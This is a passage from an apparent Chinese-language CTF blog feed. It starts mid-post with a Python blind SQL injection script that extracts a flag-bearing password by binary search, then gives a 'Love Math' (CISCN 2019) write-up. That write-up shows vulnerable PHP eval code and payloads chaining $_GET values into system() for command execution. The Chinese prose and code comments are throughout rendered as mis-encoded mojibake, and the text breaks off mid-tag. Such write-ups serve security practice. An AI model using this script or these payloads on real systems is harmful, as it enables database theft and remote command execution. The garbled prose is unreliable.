database_nameå­˜å‚¨æ•°æ®åº“åå­—</span><br>database_name = <span class="hljs-string">&quot;geek&quot;</span><br><span class="hljs-comment"># table_nameå­˜å‚¨æŒ‡å®šè¡¨çš„åå­—</span><br>table_name = <span class="hljs-string">&quot;F1naI1y&quot;</span><br><span class="hljs-comment"># col_nameå­˜å‚¨æŒ‡å®šå­—æ®µçš„åå­—</span><br>col_name = <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-comment"># col_data_numå­˜å‚¨æœ‰å¤šå°‘åˆ—</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘åˆ—æ•°æ®ï¼Œç”±äºåˆåœ¨ä¸€èµ·æ˜¾ç¤ºæ‰€ä»¥åªæœ‰ä¸€åˆ—</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnumå­˜å‚¨æ¯ä¸ªå­—æ®µæ•°æ®çš„å­—ç¬¦ä¸ªæ•°</span><br><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šè¦æŸ¥çœ‹å¤šå°‘å­—ç¬¦æ•°æ®</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆéå†è¯¥å­—æ®µæœ‰å¤šå°‘åˆ—</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># dataç”¨æ¥å­—æ®µè¯¥åˆ—çš„æ•°æ®</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload3 = <span class="hljs-string">&quot;1^(ascii(substr((select(password)from(&#123;&#125;)where(username=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload3)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€åˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;å­—æ®µç¬¬&#123;&#125;åˆ—çš„å€¼:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">passwordå­—æ®µç¬¬1åˆ—çš„å€¼:flag&#123;0ca992a6-fc81-43d7-8419-deba5dea5107&#125;<br></code></pre></td></tr></table></figure><p>flag &#x3D; flag{0ca992a6-fc81-43d7-8419-deba5dea5107}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN 2019 åˆèµ›]Love Math é¢˜è§£</title>
    <link href="/2023/08/24/2023-08-24-Love%20Math/"/>
    <url>/2023/08/24/2023-08-24-Love%20Math/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><p>1.æ‰“å¼€ç½‘é¡µå‘ç°æ˜¯PHPä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//ä¾‹å­ c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>2.ä»£ç å®¡è®¡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="hljs-comment">//issetå‡½æ•°ç”¨äºåˆ¤æ–­è¯¥å˜é‡æ˜¯å¦ä¸ºnull,å¦‚æœä¸ºnullè¿”å›flase</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//ä¾‹å­ c=20-1</span><br>    <span class="hljs-comment">//å°†GETæ–¹æ³•è·å–çš„å†…å®¹ä¼ è¾“ç»™å˜é‡content</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-comment">//åˆ¤æ–­è¾“å…¥çš„å†…å®¹é•¿åº¦æ˜¯å¦&gt;=80</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//è®¾ç½®é»‘åå•æ•°æ®:ç©ºæ ¼,\t,\r,&#x27;,&quot;,`,[,]</span><br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<span class="hljs-comment">//éå†é»‘åå•æ•°æ®</span><br>        <span class="hljs-comment">//æ­£åˆ™è¡¨è¾¾å¼/mè¡¨ç¤ºå¤šè¡ŒåŒ¹é…</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-comment">//è®¾ç½®å¯ä»¥è¢«å…è®¸ä½¿ç”¨çš„å‡½æ•°åå•</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-comment">//$used_funcsç”¨äºå­˜å‚¨åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span><br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>); <br>    <span class="hljs-comment">//$used_funcs[0]:è¡¨ç¤ºæ•°ç»„used_funcsçš„èµ·å§‹åœ°å€ï¼Œä½¿funcä»æ•°ç»„ç¬¬ä¸€ä¸ªå¼€å§‹å–ï¼Œç›´åˆ°æœ€åä¸€ä¸ª </span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<span class="hljs-comment">//éå†åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-comment">//åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²å¦‚æœä¸å­˜åœ¨äºç™½åå•ä¸­</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//æœ‰å±é™©å‡½æ•°æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡$content=system(&quot;ls /&quot;)æ‰§è¡Œæ¶æ„ä»£ç </span><br>&#125; <br></code></pre></td></tr></table></figure><p>å‡½æ•°ä»‹ç»:<br><strong>issert:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç”¨äºåˆ¤æ–­å˜é‡çš„å†…å®¹æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºnull,åˆ™è¿”å›false<br></code></pre></td></tr></table></figure><p><strong>show_source(filename,return)</strong>:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">show_source() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œ PHP è¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚è¯­æ³•é€šè¿‡ä½¿ç”¨ HTML æ ‡ç­¾è¿›è¡Œé«˜äº®ã€‚<br><br>ç”¨äºé«˜äº®çš„é¢œè‰²å¯é€šè¿‡ php.ini æ–‡ä»¶è¿›è¡Œè®¾ç½®æˆ–è€…é€šè¿‡è°ƒç”¨ ini_set() å‡½æ•°è¿›è¡Œè®¾ç½®ã€‚<br><br>show_source() æ˜¯ highlight_file() çš„åˆ«åã€‚<br><br>æ³¨é‡Šï¼šå½“ä½¿ç”¨è¯¥å‡½æ•°æ—¶ï¼Œæ•´ä¸ªæ–‡ä»¶éƒ½å°†è¢«æ˜¾ç¤ºï¼ŒåŒ…æ‹¬å¯†ç å’Œå…¶ä»–æ•æ„Ÿä¿¡æ¯ï¼<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824101642383.png" alt="image-20230824101642383"></p><p><strong>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] ):</strong><br><img src="/images/2023-8-24_LoveMath/image-20230824102848164.png" alt="image-20230824102848164"></p><p><strong>in_array(search,array,type)</strong></p><p><img src="/images/2023-8-24_LoveMath/image-20230824104747383.png" alt="image-20230824104747383"></p><p>3.åˆ†æ:<br><strong>ç”±äºæˆ‘ä»¬éœ€è¦åˆ©ç”¨æœ€åeval()å‡½æ•°æ‰§è¡Œæ¶æ„ä»£ç ï¼Œæ‰€ä»¥æœ€åcontentçš„å€¼åº”è¯¥ä¸º:</strong><br><strong>system(â€œls &#x2F;â€œ)</strong></p><p>æµ‹è¯•ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;system(&quot;dir&quot;)&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//å‘ç”Ÿå‡½æ•°æ‰§è¡Œ</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:<br><img src="/images/2023-8-24_LoveMath/image-20230824105712830.png" alt="image-20230824105712830"></p><p>è€Œcontentçš„å€¼åˆæ˜¯GET(â€˜câ€™)è¿›è¡Œè·å–</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=system(&quot;ls /&quot;)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824105855231.png" alt="image-20230824105855231"></p><p>è¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä¸­å«æœ‰é»‘åå•å­—ç¬¦:â€,ç©ºæ ¼</p><p><strong>åœ¨PHPä»£ç ä¸­æ²¡æœ‰â€â€å‘½ä»¤ä¾ç„¶å¯ä»¥è¢«æ‰§è¡Œ:</strong><br>æµ‹è¯•:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;system(dir)&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//å‘ç”Ÿå‡½æ•°æ‰§è¡Œ</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:<br><img src="/images/2023-8-24_LoveMath/image-20230824110120472.png" alt="image-20230824110120472"></p><p><strong>ç”±äºeval()å¯ä»¥æ‰§è¡Œæ­£ç¡®è¯­æ³•çš„PHPä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨eval()ä¸­æ„é€ ä¸€ä¸ªPHPä»£ç ,å³ç”¨å˜é‡ä¿å­˜å‡½æ•°å’Œå‚æ•°:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">eval(echo $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]));<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€åæ„é€ çš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p><strong>GET()å‡½æ•°ä¸­ä¹Ÿå¯ä»¥ä¸éœ€è¦å•å¼•å·â€™â€™,å¹¶ä¸”[]å¯ä»¥ä½¿ç”¨{}ä»£æ›¿</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;a&#125;($_GET&#123;b&#125;)&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>&#123;a&#125;(<span class="hljs-variable">$_GET</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=system&amp;b=dir <br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><img src="/images/2023-8-24_LoveMath/image-20230824130556447.png" 